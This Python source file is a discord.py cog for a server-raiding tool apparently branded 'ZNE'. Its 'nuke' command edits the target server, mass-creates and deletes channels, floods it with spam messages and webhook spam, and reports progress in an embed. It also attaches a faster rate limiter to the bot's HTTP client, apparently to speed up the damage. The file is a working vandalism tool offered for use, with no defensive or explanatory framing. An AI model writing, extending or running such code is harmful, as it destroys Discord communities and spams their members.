from __future__ import annotations
import asyncio
import time
import discord
from discord.ext import commands

from core.ratelimit import limiter
from core.operations import Operations


class Nuke(commands.Cog):
    def __init__(self, bot: commands.Bot):
        self.bot = bot
        self.operations: Operations = bot.operations

    @commands.command(name="nuke")
    @commands.has_permissions(administrator=True)
    @commands.guild_only()
    async def nuke(self, ctx: commands.Context) -> None:
        guild = ctx.guild
        if not self.operations:
            await ctx.reply("operations not initialized", delete_after=5)
            return

        start = time.perf_counter()
        embed = discord.Embed(
            title="ZNE Nuking...",
            description=f"Target: **{guild.name}** (`{guild.id}`)",
            color=discord.Color.red(),
        )
        embed.add_field(name="Status", value="starting...", inline=False)
        msg = await ctx.reply(embed=embed)

        try:
            await self.operations.mess_server(guild)
            embed.set_field_at(0, name="Status", value="server edited", inline=False)
            await msg.edit(embed=embed)

            created = await self.operations.CrChannel(guild)
            embed.add_field(name="Channels created", value=str(created), inline=True)
            await msg.edit(embed=embed)

            deleted = await self.operations.DelChannels(guild)
            embed.add_field(name="Channels deleted", value=str(deleted), inline=True)
            await msg.edit(embed=embed)

            spammed = await self.operations.spam(guild)
            embed.add_field(name="Spam sent", value=str(spammed), inline=True)
            await msg.edit(embed=embed)

            webhook_msgs = await self.operations.spam_webhook(guild)
            embed.add_field(name="Webhook spam", value=str(webhook_msgs), inline=True)
            await msg.edit(embed=embed)

            elapsed = time.perf_counter() - start
            embed.title = "ZNE Nuke Complete"
            embed.color = discord.Color.dark_red()
            embed.add_field(name="Elapsed", value=f"{elapsed:.2f}s", inline=False)
            await msg.edit(embed=embed)
        except Exception as e:
            embed.title = "Nuke failed"
            embed.add_field(name="Error", value=str(e)[:1000], inline=False)
            await msg.edit(embed=embed)

    @nuke.error
    async def nuke_error(self, ctx: commands.Context, error):
        if isinstance(error, commands.MissingPermissions):
            await ctx.reply("you need administrator for this", delete_after=5)


async def setup(bot: commands.Bot) -> None:
    if not hasattr(bot.http, "fast_limiter"):
        bot.http.fast_limiter = limiter(bot.http)
    await bot.add_cog(Nuke(bot))
